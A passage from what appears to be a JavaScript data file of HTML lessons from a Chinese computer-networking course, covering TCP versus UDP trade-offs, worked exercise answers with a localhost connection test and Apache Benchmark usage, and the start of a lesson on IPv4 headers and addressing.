DNSLookup，这类型的操作只需要一次简单的请求/返回，不需要建立连接，用 UDP 就足够了。</p>\n<p data-nodeid="1071">近些年有一个趋势，TCP/UDP 的边界逐渐变得模糊，UDP 应用越来越多。比如传输文件，如果考虑希望文件无损到达，可以用 TCP。如果考虑希望传输足够块，就可能会用 UDP。再比如 HTTP 协议，如果考虑请求/返回的可靠性，用 TCP 比较合适。但是像 HTTP 3.0 这类应用层协议，从功能性上思考，暂时没有找到太多的优化点，但是想要把网络优化到极致，就会用 UDP 作为底层技术，然后在 UDP 基础上解决可靠性。</p>\n<p data-nodeid="1072"><strong data-nodeid="1210">所以理论上，任何一个用 TCP 协议构造的成熟应用层协议，都可以用 UDP 重构</strong>。这就好比，本来用一个工具可以解决所有问题，但是如果某一类问题体量非常大，就会专门为这类问题创造工具。因此，UDP 非常适合需要定制工具的场景。</p>\n<p data-nodeid="1073">下面我把场景分成三类，TCP 应用场景、UDP 应用场景、模糊地带（TCP、UDP 都可以考虑），你可以参考。</p>\n<p data-nodeid="1074"><strong data-nodeid="1215">第一类：TCP 场景</strong></p>\n<ul data-nodeid="1075">\n<li data-nodeid="1076">\n<p data-nodeid="1077">远程控制（SSH）</p>\n</li>\n<li data-nodeid="1078">\n<p data-nodeid="1079">File Transfer Protocol（FTP）</p>\n</li>\n<li data-nodeid="1080">\n<p data-nodeid="1081">邮件（SMTP、IMAP）等</p>\n</li>\n<li data-nodeid="1082">\n<p data-nodeid="1083">点对点文件传出（微信等）</p>\n</li>\n</ul>\n<p data-nodeid="1084"><strong data-nodeid="1223">第二类：UDP 场景</strong></p>\n<ul data-nodeid="1085">\n<li data-nodeid="1086">\n<p data-nodeid="1087">网络游戏</p>\n</li>\n<li data-nodeid="1088">\n<p data-nodeid="1089">音视频传输</p>\n</li>\n<li data-nodeid="1090">\n<p data-nodeid="1091">DNS</p>\n</li>\n<li data-nodeid="1092">\n<p data-nodeid="1093">Ping</p>\n</li>\n<li data-nodeid="1094">\n<p data-nodeid="1095">直播</p>\n</li>\n</ul>\n<p data-nodeid="1096"><strong data-nodeid="1232">第三类：模糊地带</strong></p>\n<ul data-nodeid="1097">\n<li data-nodeid="1098">\n<p data-nodeid="1099">HTTP（目前以 TCP 为主）</p>\n</li>\n<li data-nodeid="1100">\n<p data-nodeid="1101">文件传输</p>\n</li>\n</ul>\n<p data-nodeid="1102">以上我们从多个方面了解了 TCP 和 UDP 的区别，最后再来总结一下。UDP 不提供可靠性，不代表我们不能解决可靠性。UDP 的核心价值是灵活、轻量，构造了最小版本的传输层协议。在这个之上，还可以实现连接（Connection），实现会话（Session），实现可靠性（Reliability）……</p>\n<h3 data-nodeid="1103">总结</h3>\n<p data-nodeid="1104">这一讲我们针对 UDP 协议的内容进行了探讨，到这里互联网协议群的传输层讲解就结束了。协议对于我们来说是非常重要的，协议的制定让所有参与者一致、有序地工作。</p>\n<p data-nodeid="1105">学习协议的设计，对你的工作非常有帮助。比如：</p>\n<ul data-nodeid="1106">\n<li data-nodeid="1107">\n<p data-nodeid="1108">学习 TCP 协议可以培养你思维的缜密性——序号的设计、滑动窗口的设计、快速重发的设计、内在状态机的设计，都是非常精妙的想法；</p>\n</li>\n<li data-nodeid="1109">\n<p data-nodeid="1110">学习 UDP 协议可以带动我们反思自己的技术架构，有时候简单的工具更受欢迎。Linux 下每个工具都是那么简单、专注，容易理解。相比 TCP 协议，UDP 更容易理解。</p>\n</li>\n</ul>\n<p data-nodeid="1111">从程序架构上来说，今天我们更倾向于简单专注的设计，我们更期望有解决报文传输的工具、有解决可靠性的工具、有解决流量控制的工具、有解决连接和会话的工具……我相信这应该是未来的趋势——由大量优质的工具逐渐取代历史上沉淀下来完整统一的系统。从这个角度，我希望通过学习传输层的知识，能够帮助你重新审视自己的系统设计，看看自己还有哪些进步的空间。</p>\n<p data-nodeid="1112">那么通过这一讲的学习，你可以尝试来回答 TCP 协议和 UDP 协议的优势和劣势？</p>\n<p data-nodeid="1113">【<strong data-nodeid="1252">解析</strong>】<strong data-nodeid="1253">TCP 最核心的价值就是提供封装好的一套解决可靠性的优秀方案</strong>。 在前面 3 讲中，你可以看到解决可靠性是非常复杂的，要考虑非常多的因素。TCP 帮助我们在确保吞吐量、延迟、丢包率的基础上，保证可靠性。</p>\n<p data-nodeid="1114">历史上 TCP 也是靠可靠性起家的，有一次著名的实验，TCP 协议的设计者做了一次演示——利用 TCP 协议将数据在卫星和地面之间传播了很多次，没有发生任何数据损坏。从那个时候开始，研发人员开始大量选择 TCP 协议。然后随着生态的发展，逐渐提供了流控等能力。<strong data-nodeid="1259">TCP 的成功在于它给人们提供了很多现成、好用的能力</strong>。</p>\n<p data-nodeid="1115"><strong data-nodeid="1268">UDP 则不同，UDP 提供了最小版的实现，只支持 Checksum</strong>。<strong data-nodeid="1269">UDP 最核心的价值是灵活、轻量、传输速度快</strong>。考虑到不同应用的特性，如果不使用一个大而全的方案，为自己的应用特性量身定做，可能会做得更好。比如网络游戏中游戏客户端不断向服务端发送玩家的位置，如果某一次消息丢失了，只要这个消息不影响最终的游戏结果，就可以只看下一个消息。不同应用有不同的特性，需要的可靠性级别不一样，这就是越来越多的应用开始使用 UDP 的原因之一。</p>\n<p data-nodeid="1116">其实对于我们来说，TCP 协议和 UDP 协议根本不存在什么优势和劣势，只不过是场景不同，选择不同而已。<strong data-nodeid="1275">最后还有一个非常重要的考虑因素就是成本，如果没有足够专业的团队解决网络问题，TCP 无疑会是更好的选择</strong>。</p>\n<h3 data-nodeid="1117">思考题</h3>\n<p data-nodeid="1118"><strong data-nodeid="1281">最后我再给你出一道需要查资料的思考题：Moba 类游戏的网络应该用 TCP 还是 UDP</strong>？</p>\n<p data-nodeid="1119">可以把你的想法写在留言区，我们一起讨论。如果你觉得今天的内容对你有所启发，欢迎分享给身边的朋友。如果你对本次课程有什么建议和疑问，可以在评论区留言和我讨论。</p>\n<p data-nodeid="1120" class="">这一讲就到这里。发现求知的乐趣，我是林䭽，感谢你学习本次课程。下一讲，我们将学习“06 | IPv4 协议：路由和寻址的区别是什么？”，一起看看传输层下面的网络层如何工作。</p>',
        article_title: "05 | UDP 协议：TCP 协议和 UDP 协议的优势和劣势？",
        title: "05 | UDP 协议：TCP 协议和 UDP 协议的优势和劣势？",
        id: 7269,
      },
      {
        content:
          '<p data-nodeid="1065" class="">今天我会带你把《<strong data-nodeid="1122">模块一：互联网和传输层协议</strong>》中涉及的课后练习题，逐一讲解，并给出每一讲练习题的解题思路和答案。</p>\n<h3 data-nodeid="1066"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7266&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1127">02 | 传输层协议 TCP ： TCP 为什么握手是 3 次、挥手是 4 次？</a></h3>\n<p data-nodeid="1067">【<strong data-nodeid="1137">问题</strong>】<strong data-nodeid="1138">一台内存在 8G 左右的服务器，可以同时维护多少个连接</strong>？</p>\n<p data-nodeid="1068">【<strong data-nodeid="1144">解析</strong>】连接是内存中的状态对象，从理论上分析，连接本身不太占用内存。不同语言连接对象大小不等，但是通常很小。下面我提供一段 Java 程序，你可以感受一下：</p>\n<pre class="lang-java" data-nodeid="1069"><code data-language="java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Server</span> </span>{\n&nbsp; &nbsp; <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] argv)</span> <span class="hljs-keyword">throws</span> IOException </span>{\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> serverSocket = <span class="hljs-keyword">new</span> ServerSocket();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> addr = <span class="hljs-keyword">new</span> InetSocketAddress(<span class="hljs-number">3001</span>);\n&nbsp; &nbsp; &nbsp; &nbsp; serverSocket.bind(addr);\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> list = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>) {\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> client = serverSocket.accept();\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; list.add(client);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; System.out.println(list.size());\n&nbsp; &nbsp; &nbsp; &nbsp; }\n&nbsp; &nbsp; }\n}\n<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span> </span>{\n&nbsp; &nbsp; <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] argv)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException </span>{\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> clients = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">3001</span>);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; clients.add(client);\n&nbsp; &nbsp; &nbsp; &nbsp; }\n&nbsp; &nbsp; &nbsp; &nbsp; Thread.sleep(<span class="hljs-number">10000000</span>);\n&nbsp; &nbsp; }\n}\n</code></pre>\n<p data-nodeid="1070">通过运行上面这段程序，你可以观察到以下这几个现象：</p>\n<ol data-nodeid="1071">\n<li data-nodeid="1072">\n<p data-nodeid="1073">创建 100W 连接速度不是很快，<strong data-nodeid="1151">这说明 TCP 连接创建有成本</strong>（3 次握手，都是网络 IO）；</p>\n</li>\n<li data-nodeid="1074">\n<p data-nodeid="1075">用<code data-backticks="1" data-nodeid="1153">jps</code>找到对应的进程的<code data-backticks="1" data-nodeid="1155">id</code>，在用<code data-backticks="1" data-nodeid="1157">sudo cat /proc/{进程ID}/status | grep VmHWM</code>可以看到实际的内存占用。按照这种增长趋势，8G 内存空间可以轻轻松松存放 100W 个连接。</p>\n</li>\n</ol>\n<p data-nodeid="1076">但是如果单机建立太多的连接，会报一个<code data-backticks="1" data-nodeid="1160">Cannot assign requested address</code>的异常，这是因为客户端连接服务端时，操作系统要为每个客户端分配一个端口，上面的程序很快会把端口号用尽。</p>\n<p data-nodeid="1077">所以，我们可以得出一个结论：<strong data-nodeid="1167">核心的问题是，通信需要缓冲区，通信需要 I/O。这是因为通信占用资源，连接本身占用资源少</strong>。</p>\n<p data-nodeid="1078">另外，我看到的评论区有不少高质量的回答，建议你回到“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7266&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1173">02 | 传输层协议 TCP ： TCP 为什么握手是 3 次、挥手是 4 次？</a>”看一看，作为知识补充。如果看到好的答案，不妨动手点个赞（我给大家一一点了赞）。</p>\n<h3 data-nodeid="1331" class="te-preview-highlight"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7267" data-nodeid="1336">03 | TCP 的封包格式： 为什么需要粘包和拆包？</a></h3>\n\n<p data-nodeid="1080">【<strong data-nodeid="1187">问题</strong>】<strong data-nodeid="1188">有哪些好用的压测工具</strong>？</p>\n<p data-nodeid="1081">压力测试最常见的工具是 Apache Benchmark（简称 AB），在 Linux 下面可以通过包管理器安装 ab：</p>\n<pre class="lang-shell" data-nodeid="1082"><code data-language="shell">yum install httpd-tools\n// 或\napt-get install apache2-utils\n</code></pre>\n<p data-nodeid="1083">ab 安装好后，可以利用下面这条指令向某个网站发送并发 1000 的 10000 次请求：</p>\n<pre class="lang-java" data-nodeid="1084"><code data-language="java">ab -n <span class="hljs-number">10000</span> -p <span class="hljs-number">1000</span> https:<span class="hljs-comment">//example.com/</span>\n</code></pre>\n<p data-nodeid="1085">ab 是用 C 语言写的，作为一个随手就可以用的工具，它的设计非常简单，是一个单线程的工作模型，因此如果遇到阻塞情况，可能直接导致 ab 工具自己积压崩溃。</p>\n<p data-nodeid="1086">所以。这里我给你推荐一个 Java 生态好用的工具“JMeter”，拥有可视化的界面，如下图所示：</p>\n<p data-nodeid="1087"><img src="https://s0.lgstatic.com/i/image6/M01/3C/0A/CioPOWCH3cuACrZdAAa8J-obv7w303.png" alt="图片1.png" data-nodeid="1195"></p>\n<p data-nodeid="1088">这个工具在各个平台上都可以用，比 ab 稳定，有图形化界面，可以配置任意线程数量，还有可视化的图表支持。</p>\n<h3 data-nodeid="1089"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7268&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1201">04 | TCP 的稳定性 ：滑动窗口和流速控制是怎么回事？</a></h3>\n<p data-nodeid="1090">【<strong data-nodeid="1214">问题</strong>】<strong data-nodeid="1215">先不要查资料</strong>，<strong data-nodeid="1216">既然发送方有窗口，那么接收方也需要有窗口吗？</strong></p>\n<p data-nodeid="1091">【<strong data-nodeid="1222">解析</strong>】我们一起思考下，接收方收到发送方的每个数据分组（或者称为 TCP Segment），接收方肯定需要缓存。举例来说，如果发送方发送了：1, 2, 3, 4。 那么接收方可能收到的一种情况是：1，4，3。注意，没有收到 2 的原因可能是延迟、丢包等。这个时候，接收方有两种选择。</p>\n<p data-nodeid="1092"><strong data-nodeid="1227">选择一：什么都不做</strong>（这样分组 2 的 ACK 就不会发送给发送方，发送方发现没有收到 2 的 ACK，过一段时间就有可能重发 2,3,4,5）。 当然具体设计还需要探讨，比如不重发整个分组，只重发已发送没有收到 ACK 的分组。</p>\n<p data-nodeid="1093">这种方法的缺陷是<strong data-nodeid="1233">性能太差</strong>，重发了整个分组（或部分）。因此我们可以考虑另一种选择。</p>\n<p data-nodeid="1094"><strong data-nodeid="1242">选择二</strong>：如果<strong data-nodeid="1243">重发一个窗口，或部分窗口</strong>，问题就不会太大了。虽然增加了网络开销，但是毕竟有进步（1 进步了，不会再重发）。</p>\n<p data-nodeid="1095">性能方面最大的开销是<strong data-nodeid="1253">等待超时的时间</strong>，就是发送方要等到超时时间才重发窗口，这样操作性能太差。因此，TCP 协议有一个<strong data-nodeid="1254">快速重传</strong>的机制——接收方发现接收到了 1，但是没有接收到 2，那么马上发送 3 个分组 2 的 ACK 给到发送方，这样发送方收到多个 ACK，就知道接收方没有收到 2，于是马上重发 2。</p>\n<p data-nodeid="1096">无论是上面哪种方案，接收方也维护一个滑动窗口，是一个不错的选择。接收窗口的状态，可以和发送窗口的状态相互对应了。</p>\n<h3 data-nodeid="1097"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7269&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1260">05 | UDP 协议：TCP 协议和 UDP 协议的优势和劣势？</a></h3>\n<p data-nodeid="1098">【<strong data-nodeid="1270">问题</strong>】<strong data-nodeid="1271">Moba 类游戏的网络应该用 TCP 还是 UDP</strong>？</p>\n<p data-nodeid="1099">【<strong data-nodeid="1281">解析</strong>】所有在线联机游戏都有件非常重要的事情需要完成，就是<strong data-nodeid="1282">确定事件发生的唯一性</strong>，这个性质和聊天工具是类似的。听我这么说，是不是有点迷？请听我慢慢道来。</p>\n<p data-nodeid="1100">你在王者荣耀中控制后羿释放技能，这是一个事件。同时，王昭君放了大招，这是第二个事件。两个事件一定要有先后顺序吗？答案是当然要有。因为游戏在同一时刻只能有一个状态。</p>\n<p data-nodeid="1101">类比一下，多个线程同时操作内存，发生了竞争条件（具体分析可以参见<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478&amp;sid=20-h5Url-0&amp;buyFrom=2&amp;pageId=1pz4&amp;utm_source=zhuanlan%20article&amp;utm_medium=bottom&amp;utm_campaign=%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%80%9A%E5%85%B3%2029%E8%AE%B2%E3%80%8B%E4%B8%93%E6%A0%8F%E5%86%85%E5%B5%8C&amp;_channel_track_key=D2LoirKK#/content" data-nodeid="1287">《重学操作系统》</a>专栏关于“线程”的内容），那么是不是意味着，内存在同一时刻有两个状态呢？当然不是，<strong data-nodeid="1293">内存同时刻只能有一个状态，所以多个线程的操作必须有先有后</strong>。</p>\n<p data-nodeid="1102">回到 Moba 游戏的问题，每个事件，游戏服务器必须给一个唯一的时序编号，对应后羿的技能和王昭君的技能。所以，在线竞技类游戏，事实上是玩家在不断向服务器竞争一个自增序列号的过程。无论客户端发生怎样的行为，只有竞争到自增 ID 才能进步。也就是说，<strong data-nodeid="1299">服务器要尽快响应多个客户端提交的事件，并以最快的速度分配自增序号，然后返回给客户端</strong>。</p>\n<p data-nodeid="1103"><strong data-nodeid="1304">所以，Moba 服务端的核心是自增序号的计算和尽量缩减延迟</strong>。从这个角度出发，你再来看看，应该用 TCP 协议还是 UDP 协议呢？</p>\n<p data-nodeid="1104">虽然TCP 协议有 3 次握手，但是连接上之后，双方就不会再有额外的传输成本，因此创建连接的成本，可以忽略不计。</p>\n<p data-nodeid="1105">同时，TCP 协议还提供稳定性支持，不需要自己实现稳定性。如果规模较小的在线竞技类游戏，TCP 完全适用。但是当游戏玩家体量上升后，TCP 协议的头部（数据封包）较大，会增加服务器额外的 I/O 压力。要发送更多的数据，自然有更大的 I/O 压力。从这个角度来看，UDP 就有了用武之地。</p>\n<h3 data-nodeid="1106">总结</h3>\n<p data-nodeid="1107">本模块我们学习互联网协议群中最重要的两种传输层协议：TCP 协议和 UDP 协议。这两种协议，应该是你以后打交道最多的传输层协议。我认为，除了协议本身，协议的设计者的设计思路，是你更应该重视的事情。</p>\n<p data-nodeid="1108">希望通过本次课程的学习，你能够有所收获，将来遇到相关问题，能对应到这一模块所学的知识，比如：</p>\n<ul data-nodeid="1109">\n<li data-nodeid="1110">\n<p data-nodeid="1111">当你既要保证 FIFO，又要提供多处理的数据结构时，可以想到<strong data-nodeid="1315">滑动窗口</strong>；</p>\n</li>\n<li data-nodeid="1112">\n<p data-nodeid="1113">当你设计请求/响应模型的时，可以想到<strong data-nodeid="1321">多路复用</strong>；</p>\n</li>\n<li data-nodeid="1114">\n<p data-nodeid="1115">当你为自己的应用选择协议时，可以想到<strong data-nodeid="1327">实现可靠性最基本的思路</strong>。</p>\n</li>\n</ul>\n<p data-nodeid="1116" class="">好的，这一讲就到这里。发现求知的乐趣，我是林䭽，感谢你学习本次课程。 接下来我们将进入“模块二”开始学习网络层协议，下一讲介绍“06 | IPv4 协议：路由和寻址的区别是什么？”再见！</p>',
        article_title: "加餐 | 模块一思考题解答",
        title: "加餐 | 模块一思考题解答",
        id: 7270,
      },
    ],
  },
  {
    chapterTitle: "模块二：网络层协议",
    children: [
      {
        content:
          '<p data-nodeid="44128" class="">如果说传输层协议，除了 TCP/UDP，我们还可以有其他选择，比如 Google 开发的 QUIC 协议，帮助在传输层支持 HTTP 3.0 传输。但是在网络层，IP 协议几乎一统天下。IP 协议目前主要有两个版本 IPv4 和 IPv6。这一讲我们先介绍 IPv4 协议。</p>\n<p data-nodeid="44129">根据 Google 统计，使用 IPv6 的Google 用户比例在 30% 左右。</p>\n<p data-nodeid="44130"><img src="https://s0.lgstatic.com/i/image6/M01/3C/01/Cgp9HWCH3k-AD1ubAAEP-86qWSo941.png" alt="Drawing 0.png" data-nodeid="44262"></p>\n<p data-nodeid="44131">IPv4使用范围很大，平时工作中很容易遇到，比如开发场景、网络优化场景、解决线上问题场景等。相信你经常会碰到一些和 IP 协议相关的名词，比如说<strong data-nodeid="44272">这一</strong>讲<strong data-nodeid="44273">关联的面试题目：路由和寻址的区别是什么</strong>？因此，学习 IPv4 还是非常有意义的。接下来，就请你带着对上面的问题，开启今天的学习。</p>\n<h3 data-nodeid="44132">什么是 IP 协议？</h3>\n<p data-nodeid="44133"><strong data-nodeid="44283">IP 协议</strong>（<strong data-nodeid="44284">Internet Protocol</strong>）是一个处于垄断地位的网络层协议。 IPv4 就是 IP 协议的第 4 个版本，是目前互联网的主要网络层协议。IPv4 为传输层提供 Host-To-Host 的能力，IPv4 需要底层数据链路层的支持。</p>\n<p data-nodeid="44487" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/85/CioPOWCKhIKAEjAaAAA-0cJYHuU062.png" alt="image.png" data-nodeid="44490"></p>\n\n<p data-nodeid="44135">IP 协议并不负责数据的可靠性。传输数据时，数据被切分成一个个数据封包。IP 协议上层的传输层协议会对数据进行一次拆分，IP 协议还会进一步进行拆分。进行两次拆分是为了适配底层的设备。</p>\n<p data-nodeid="44136">之前我们提到过， 数据在网络中交换（封包交换算法），并不需要预先建立一个连接，而是任由数据在网络中传输，每个节点通过路由算法帮助数据封包选择下一个目的地。</p>\n<p data-nodeid="44137">这里再复习一下可靠性，<strong data-nodeid="44295">可靠性保证数据无损地到达目的地</strong>。可靠性是 IP 协议上方的 Host-To-Host 协议保证的，比如 TCP 协议通过应答机制、窗口等保证数据的可靠性。 IP 协议自身不能保证可靠性。比如 IP 协议可能会遇到下面这几个问题：</p>\n<ul data-nodeid="44138">\n<li data-nodeid="44139">\n<p data-nodeid="44140">封包损坏（数据传输过程中被损坏）；</p>\n</li>\n<li data-nodeid="44141">\n<p data-nodeid="44142">丢包（数据发送过程中丢失）；</p>\n</li>\n<li data-nodeid="44143">\n<p data-nodeid="44144">重发（数据被重发，比如中间设备通过 2 个路径传递数据）；</p>\n</li>\n<li data-nodeid="44145">\n<p data-nodeid="44146">乱序（到达目的地时数据和发送数据不一致）。</p>\n</li>\n</ul>\n<p data-nodeid="44147">但是 IP 协议并不会去处理这些问题，因为网络层只专注解决网络层的问题， 而且不同特性的应用在不同场景下需要解决的问题不一样。对于网络层来说，这里主要有 3 个问题要解决：</p>\n<ul data-nodeid="44148">\n<li data-nodeid="44149">\n<p data-nodeid="44150">延迟</p>\n</li>\n<li data-nodeid="44151">\n<p data-nodeid="44152">吞吐量</p>\n</li>\n<li data-nodeid="44153">\n<p data-nodeid="44154">丢包率</p>\n</li>\n</ul>\n<p data-nodeid="44155">这三个是鱼和熊掌不能兼得，我们后续会讨论。</p>\n<p data-nodeid="44156">另外，IP 协议目前主要有两种架构，一种是 IPv4，是目前应用最广泛的互联网协议；另一种是 IPv6，目前世界各地正在积极地部署 IPv6。这块我们最后讨论。</p>\n<h3 data-nodeid="44157">IP 协议的工作原理</h3>\n<p data-nodeid="44158"><strong data-nodeid="44315">IP 协议接收 IP 协议上方的 Host-To-Host 协议传来的数据，然后进行拆分，这个能力叫作分片（Fragmentation）</strong>。然后 IP 协议为每个片段（Fragment）增加一个 IP 头（Header），组成一个<strong data-nodeid="44316">IP 封包</strong>（Datagram）。之后，IP 协议调用底层的局域网（数据链路层）传送数据。最后 IP 协议通过寻址和路由能力最终把封包送达目的地。接下来为你讲述完整的过程。</p>\n<h4 data-nodeid="44159">分片（Fragmentation）</h4>\n<p data-nodeid="44160"><strong data-nodeid="44322">分片就是把数据切分成片</strong>。 IP 协议通过它下层的局域网（链路层）协议传输数据，因此需要适配底层传输网络的传输能力。数据太大通常就不适合底层网络传输，这就需要把大的数据切片。 当然也可能选择不切片，IP 协议提供了一个能力就是把封包标记为不切片，当底层网络看到不切片的封包，又没有能力传输的时候，就会丢弃这个封包。你要注意，在网络环境中往往存在多条路径，一条路径断了，说不定其他路径可以连通。</p>\n<h4 data-nodeid="44161">增加协议头（IP Header）</h4>\n<p data-nodeid="44162">切片完成之后，IP 协议会为每个切片（数据封包 Datagram）增加一个协议头。一个 IPv4 的协议头看上去就是如下图所示的样子：</p>\n<p data-nodeid="45209" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/7D/Cgp9HWCKhJaAKKEhAABhmC7udP0409.png" alt="image (1).png" data-nodeid="45216"></p>\n\n<p data-nodeid="44164">其中分成 4 个部分。</p>\n<ul data-nodeid="44165">\n<li data-nodeid="44166">\n<p data-nodeid="44167">最重要的是原地址和目标地址。IPv4 的地址是 4 组 8 位的数字，总共是 32 位。具体地址的作用我们在下面的“寻址部分”介绍。</p>\n</li>\n<li data-nodeid="44168">\n<p data-nodeid="44169">Type Of Service 服务的类型，是为了响应不同的用户诉求，用来选择延迟、吞吐量和丢包率之间的关系。关于这块知识，本讲后半部分就会分析。</p>\n</li>\n<li data-nodeid="44170">\n<p data-nodeid="44171">IHL（Internet Header Length）用来描述 IP 协议头的大小。所以 IP 协议头的大小是可变的。IHL 只有 4 位，最大值 1111 = 15。最大是 15 个双字（15*4 字节 = 60 字节）。</p>\n</li>\n<li data-nodeid="44172">\n<p data-nodeid="44173">Total Length 定义报文（封包 Datagram）的长度。</p>\n</li>\n<li data-nodeid="44174">\n<p data-nodeid="44175">Identification（报文的 ID），发送方分配，代表顺序。</p>\n</li>\n<li data-nodeid="44176">\n<p data-nodeid="44177">Fragment offset 描述要不要分包（拆分），以及如何拆分。</p>\n</li>\n<li data-nodeid="44178">\n<p data-nodeid="44179">Time To Live 描述封包存活的时间。因此每个 IP 封包发送出去后，就开始销毁倒计时。如果倒计时为 0，就会销毁。比如中间的路由器看到一个 TTL 为 0 的封包，就直接丢弃。</p>\n</li>\n<li data-nodeid="44180">\n<p data-nodeid="44181">Protocol 是描述上层的协议，比如 TCP = 6，UDP = 17。</p>\n</li>\n<li data-nodeid="44182">\n<p data-nodeid="44183">Options 代表可选项。</p>\n</li>\n<li data-nodeid="44184">\n<p data-nodeid="44185">Checksum 用来检验封包的正确性，具体原理我们在“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7269&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="44345">05 | UDP 协议：TCP 协议和 UDP 协议的优势和劣势？</a>”中已经介绍过了，如果 Checksum 对不上，就需要选择丢弃这个封包。</p>\n</li>\n</ul>\n<h4 data-nodeid="44186">“鱼和熊掌”不能兼得——延迟、吞吐量、丢包率</h4>\n<p data-nodeid="44187">上面我们看到 IPv4 协议中提供了一个叫作 Type of Service（服务类型）的字段。这个字段是为了在延迟、吞吐量和丢包率三者间选择。</p>\n<p data-nodeid="44188"><strong data-nodeid="44352">延迟（latency）</strong></p>\n<p data-nodeid="44189">延迟指的是 1 bit 的数据从网络的一个终端传送到另一个终端需要的时间。这个时间包括在发送端准备发送的时间、排队发送的时间、发送数据的时间、数据传输的时间等。</p>\n<p data-nodeid="44190"><strong data-nodeid="44357">吞吐量（Throughput）</strong></p>\n<p data-nodeid="44191">吞吐量指单位时间内可以传输的平均数据量。比如用 bit/s 作为单位，就是 bps。吞吐量和延迟没有联系，比如延迟很高的网络，有可能吞吐量很高。可以类比成水管很大流速很慢，对比水管很细流速很快，这两种情况，最终流量可以是相等的。</p>\n<p data-nodeid="44192"><strong data-nodeid="44362">丢包率（Packet loss）</strong></p>\n<p data-nodeid="44193">丢表率指发送出去的封包没有到达目的地的比例。 在最大流速确定的网络中，丢表率会直接影响吞吐量。</p>\n<p data-nodeid="44194">我们的网络有时候需要低延迟，比如玩一款 RTS 游戏或者 Moba 游戏，这种时候延迟非常重要。另外如果把延迟看作一个平均指标，丢包也会影响延迟——一个包丢了，需要重发。而有的应用需要高吞吐量，延迟不是很重要，比如说网盘下载文件。大部分应用期望丢包不能太严重，比如语音电话，少量丢包还能听清，大量丢包就麻烦了，根本听不清对方说什么。严格希望不丢包的应用比较少，只有极特殊的网络控制管理场景，才需要在互联网层要求不丢包。</p>\n<p data-nodeid="44195">当然这三个条件，通常不能同时满足。如果同时追求延迟、吞吐量、丢包率，那么对网络设备的要求就会非常高，说白了就会非常贵。因此 IP 协议头中的 Type of Service 字段里，有以下 4 种主要的类型可以选择：</p>\n<ul data-nodeid="44196">\n<li data-nodeid="44197">\n<p data-nodeid="44198">低延迟</p>\n</li>\n<li data-nodeid="44199">\n<p data-nodeid="44200">高吞吐量</p>\n</li>\n<li data-nodeid="44201">\n<p data-nodeid="44202">低丢包率</p>\n</li>\n<li data-nodeid="44203">\n<p data-nodeid="44204">低成本</p>\n</li>\n</ul>\n<h4 data-nodeid="44205">寻址（Addressing）</h4>\n<p data-nodeid="44206">地址想要表达的是一个东西在哪里。寻址要做的就是：给一个地址，然后找到这个东西。IPv4 协议的寻址过程是逐级寻址。</p>\n<p data-nodeid="44207"><strong data-nodeid="44375">IPv4 地址</strong></p>\n<p data-nodeid="44208">IPv4 地址是 4 个 8 位（Octet）排列而成，总共可以编址 43 亿个地址。</p>\n<p data-nodeid="44209">比如 103.16.3.1 就是一个合法的 Ipv4 地址。4 组数字用<code data-backticks="1" data-nodeid="44378">.</code>分开，是为了让人可读，实际上在内存和传输过程中，就是直接用 32 位。</p>\n<p data-nodeid="44210">你可以观察一下<code data-backticks="1" data-nodeid="44381">103.16.3.1</code>的二进制，如下图所示：</p>\n<p data-nodeid="45943" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/85/CioPOWCKhKKAXD3PAAAvHpywmcc109.png" alt="image (2).png" data-nodeid="45950"></p>\n\n\n\n<p data-nodeid="44214"><strong data-nodeid="44389">寻址过程</strong></p>\n<p data-nodeid="44215">寻址就是如何根据 IP 地址找到设备。因为 IPv4 